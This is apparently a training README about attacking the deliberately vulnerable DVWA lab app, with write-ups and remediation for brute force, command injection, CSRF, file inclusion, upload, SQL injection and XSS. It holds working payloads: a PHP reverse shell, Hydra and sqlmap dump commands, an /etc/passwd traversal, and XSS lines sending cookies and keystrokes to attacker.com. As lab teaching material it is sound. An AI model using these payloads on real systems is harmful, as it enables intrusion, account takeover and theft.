# basics-of-web-application-hacking

---

## 🧰 Installation

### 🔹 Run DVWA using Docker

DVWA provides an official Docker image that lets you deploy it instantly.

#### **Step 1: Install Docker**

Make sure Docker and Docker Compose are installed:

```bash
# On Debian/Ubuntu/Kali
sudo apt update
sudo apt install docker.io docker-compose -y

# Verify installation
docker --version
docker compose version
```

#### **Step 2: Pull the official DVWA image**

```bash
docker pull vulnerables/web-dvwa
```

#### **Step 3: Run the container**

```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
```

> 🟢 DVWA will now be accessible at:
> 👉 [http://localhost:8080](http://localhost:8080) or [http://127.0.0.1:8080](http://127.0.0.1:8080)

#### **Step 4: Log in**

Use the default credentials:

```
Username: admin
Password: password
```

#### **Step 5: Initialize the database**

1. Go to: `http://localhost:8080/setup.php`
2. Click **“Create / Reset Database”**
3. Login again at `http://localhost:8080/login.php`

---

---

### 🧠 Notes

* DVWA intentionally contains **security vulnerabilities**.
* Use **only** in an isolated environment (like a VM or Docker).
* Never expose DVWA to the public internet.

---
# Hydra Brute Force Assessment

## Test Configuration
**Tool**: THC Hydra v9.5  
**Target**: DVWA Brute Force Module  
**Command**: 
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
```

## Results
<img width="1668" height="588" alt="image" src="https://github.com/user-attachments/assets/bec9aac4-29b7-415e-ac6f-12da9c5c56fa" />

**16 valid passwords identified:**
- 123456
- password
- 123456789
- princess
- iloveyou
- [12 more...]

## Critical Vulnerabilities
- No account lockout
- No rate limiting
- Weak passwords allowed

## 🛡️ Remediation
- Implement account lockout
- Enforce strong passwords
- Add rate limiting

# Command Injection Exploitation - DVWA

## Exploit Summary
**Vulnerability**: OS Command Injection  
**Target**: DVWA Command Execution Module  
**Payload**: 
```
127.0.0.1; /usr/bin/php -r '$sock=fsockopen("172.20.10.13",4444);exec("sh <&3 >&3 2>&3");'
```

## Attack Flow

### Step 1: Initial Command Injection
<img width="700" height="487" alt="image" src="https://github.com/user-attachments/assets/14ccc83b-fc82-4561-ad5e-c9658c5591d9" />
*Command injection via IP parameter with reverse shell payload*

### Step 2: Reverse Shell Connection
<img width="482" height="537" alt="image" src="https://github.com/user-attachments/assets/f5d973af-25fb-497e-b2a2-538e05f5ab12" />
*Netcat listener receiving reverse shell connection*
<img width="958" height="642" alt="image" src="https://github.com/user-attachments/assets/b2916b2c-d3c2-45ee-948f-5d3393e3ae7b" />
*Gaining shell access*

### Command injection to find php 
```
127.0.0.1; which php
```

## Technical Details
- **Injection Point**: IP address parameter
- **Reverse Shell**: PHP backdoor to attacker IP `172.20.10.13:4444`
- **Result**: Full system compromise with root access

## 🛡️ Remediation
- Input validation and sanitization
- Use of parameterized commands
- Principle of least privilege

# CSRF Vulnerability Report

## Vulnerability Summary
**Type**: Cross-Site Request Forgery (CSRF)  
**Risk**: High  
**Location**: DVWA Password Change Function  
**Endpoint**: `http://localhost/vulnerabilities/csrf/`

## Exploitation Proof

### Vulnerable Request
```
GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change
```
The password can be changed using the vuln request by modifying the parameters password_new and password_conf
### CSRF PoC
```html
<html>
<body>
    <form action="http://localhost/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="attacker123">
        <input type="hidden" name="password_conf" value="attacker123">
        <input type="submit" name="Change" value="Change">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

## Impact
- Unauthorized password change for authenticated users
- Full account takeover
- No user interaction required

## 🛡️ Remediation
- Implement CSRF tokens
- Change GET to POST for state-changing operations
- Add SameSite cookies and referrer validation

---

# Local File Inclusion (LFI) Vulnerability

## Vulnerability Summary
**Type**: Local File Inclusion  
**Risk**: Critical  
**Location**: DVWA File Inclusion Module  
**Parameter**: `page` 

## Exploitation Proof

### System File Disclosure
```
http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd
```

### Normal Operation
```
http://localhost/vulnerabilities/fi/?page=file1.php
```

## Impact
- Read sensitive system files (`/etc/passwd`)
- Potential source code disclosure
- Path traversal to arbitrary file access

## Proof Of Concept
<img width="962" height="399" alt="image" src="https://github.com/user-attachments/assets/458f89b7-05d3-46a0-a5ec-de169e1938e7" />
*Successful retrieval of /etc/passwd via path traversal*

## 🛡️ Remediation
- Implement input validation
- Use whitelist of allowed files
- Restrict directory traversal characters

---
# Unrestricted File Upload Vulnerability

## Vulnerability Summary
**Type**: Unrestricted File Upload → RCE  
**Risk**: Critical  
**Location**: DVWA File Upload Module  
**Security Level**: Medium

## Exploitation Chain

### 1. File Upload Bypass
- **File**: `php-reverse-shell.php`
- **Bypass Method**: Content-Type changed to `image/jpeg`
- **Upload Path**: `../../../hackable/uploads/php-reverse-shell.php`

### 2. Reverse Shell Execution
```bash
nc -nlvp 4444
```
- **Listener**: Attacker machine port 4444
- **Shell Access**: Successful connection caught

## Impact
- Remote code execution
- Full system compromise
- Web server privilege access

## Proof Of Concept
<img width="587" height="949" alt="image" src="https://github.com/user-attachments/assets/07d68aa8-0194-4840-b00b-471d74601672" />
<img width="1252" height="948" alt="image" src="https://github.com/user-attachments/assets/79d5992a-5d30-4686-a297-93b58500534c" />
*Webshell uploaded with image content-type bypass*
<img width="933" height="465" alt="image" src="https://github.com/user-attachments/assets/f73dc7de-19f2-4b3f-a844-8ab20a5cf022" />
visit http://localhost/hackable/uploads/php-reverse-shell.php

## 🛡️ Remediation
- Validate file content, not just headers
- Implement file type verification
- Restrict executable upload directories

---


# SQL Injection Exploitation with SQLMap

## Simple SQL Injection
<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/27212330-a322-476a-b6fc-3bb803990506" />
<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/3afdabf7-833b-4b68-b756-92a34c51cd3b" />

**Automated Commands:**

```bash
# Save request to file first, then:
sqlmap -r request.txt -p id --batch --dbs
sqlmap -r request.txt -p id --batch -D dvwa --tables
sqlmap -r request.txt -p id --batch -D dvwa -T users --dump
```

## Blind SQL Injection
<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/977b68c3-b4b8-46f4-a378-7f2501830706" />
<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/ffeb547e-99ba-4a2a-947e-b79b8ea1cc99" />

**Automated Commands:**
```bash
# Save request to file first, then:
sqlmap -r request.txt -p id --batch --technique=B --dbs
sqlmap -r request.txt -p id --batch --technique=B -D dvwa -T users --dump
```

## Quick Exploitation
```bash
# Simple SQLi
sqlmap -r request.txt -p id --batch --current-db

# Blind SQLi  
sqlmap -r request.txt -p id --batch --technique=B --current-db
```

**Note:** Save HTTP requests to `request.txt` before running SQLMap commands.
# 🛡️ SQL Injection Remediation

## Comprehensive Security Measures

### 1. Input Validation & Parameterized Queries
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = $id";

// Secure - Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### 2. Defense Layers
- **Use Prepared Statements** (PDO/MySQLi)
- **Implement Input Whitelisting**
- **Apply Least Privilege Principle** to DB users
- **Enable Web Application Firewall (WAF)**
- **Regular Security Patching**

### 3. Secure Coding Practices
- **Never concatenate** user input in queries
- **Use ORM/Query Builders** when possible
- **Validate & Sanitize** all inputs
- **Implement Proper Error Handling** (no detailed errors to users)

### 4. Continuous Security
- **Code Review** for SQLi vulnerabilities
- **Penetration Testing** & Security Audits
- **Automated Security Scanning** in CI/CD

**Remember:** Parameterized queries are the most effective defense against SQL injection attacks.

# Cross-Site Scripting (XSS) Vulnerability Guide

## 🔍 Understanding XSS Types

### 1. Reflected XSS
**How it works:** Malicious script is reflected off a web server in response to user input
- **Attack vector:** URL parameters, form inputs, search fields
- **Impact:** Steal sessions, redirect users, deface websites

<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/59054ef5-b394-422b-95fc-5d994e8ffafe" />
<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/c62a64ac-d773-4fd7-aa65-a54c538e5c11" />

**Example Attack:**
```http
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS
**How it works:** Malicious script is stored on the server and executed when accessed
- **Attack vector:** Comments, user profiles, forum posts, databases
- **Impact:** Affects all users, persistent threat

<img width="577" height="802" alt="image" src="https://github.com/user-attachments/assets/0df0bbf6-b19d-4123-8901-fae1f781ef78" />
<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/9b3d3f35-1c5b-4d02-bb22-0d7fbba6321b" />

**Example Attack:**
```html
<!-- Malicious comment stored in database -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

### 3. DOM-based XSS
**How it works:** Vulnerability exists in client-side code manipulating the DOM
- **Attack vector:** URL fragments, client-side JavaScript
- **Impact:** Client-side only, no server interaction needed

<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/b22d543e-1951-46c6-b4f5-5c2de651d5f1" />
<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/6fc06e56-66d5-4fc4-8cb0-030b1f308742" />

**Example Attack:**
```javascript
// Vulnerable code
document.getElementById('output').innerHTML = window.location.hash.substring(1);
// Attack: http://site.com#<img src=x onerror=stealCookies()>
```

## 🛠️ Common XSS Payloads

### Basic Test Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(document.domain)>
```

### Advanced Attack Payloads
```html
<!-- Cookie theft -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>

<!-- CSRF attack -->
<script>
fetch('/change-email', {
  method: 'POST',
  body: 'email=attacker@evil.com'
})
</script>
```

---

# 🛡️ XSS Remediation

## Essential Protections

**1. Input Validation**
```php
$clean = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**2. Security Headers**
```http
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
```

**3. Safe Coding**
- Validate all inputs
- Encode all outputs
- Use HTTPOnly cookies
- Avoid `innerHTML`

**Never trust user input - always validate and encode.**
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00c8ff; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00c8ff; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00c8ff; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00c8ff; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00c8ff; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00c8ff; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00c8ff; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00c8ff; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00c8ff; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style> 
